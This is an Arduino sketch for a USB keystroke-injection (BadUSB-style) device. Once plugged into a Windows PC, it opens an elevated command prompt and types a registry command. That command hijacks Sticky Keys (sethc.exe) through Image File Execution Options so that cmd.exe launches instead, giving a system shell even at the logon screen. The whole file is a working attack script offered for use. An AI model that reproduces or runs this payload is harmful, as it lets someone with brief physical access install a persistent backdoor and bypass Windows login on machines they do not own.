#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Clear Focus
  en.pressAndRelease(KEY_ESCAPE);
  //Search
  en.pressAndRelease(KEY_ESCAPE,MOD_CONTROL_LEFT);
  en.sleep(1000);
  en.echo("cmd.exe");
  en.sleep(1000);
  //Execute as administrator
  en.pressAndRelease(KEY_TAB);
  en.pressAndRelease(KEY_TAB);
  en.pressAndRelease(KEY_DOWN_ARROW);
  en.pressAndRelease(KEY_DOWN_ARROW);
  en.pressAndRelease(KEY_DOWN_ARROW);
  en.pressAndRelease(KEY_ENTER,MOD_SHIFT_LEFT|MOD_CONTROL_LEFT);
  en.sleep(2000);
  en.pressAndRelease(KEY_LEFT_ARROW);
  en.pressAndRelease(KEY_ENTER);
  en.sleep(1000);  
  //Inject regedit then you can press shift+alt+prtscr to open cmd, even at windows logon!
  en.writeOnBackground("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f");
  en.writeOnBackground("exit");
  en.done();
}

void loop() {
  
}

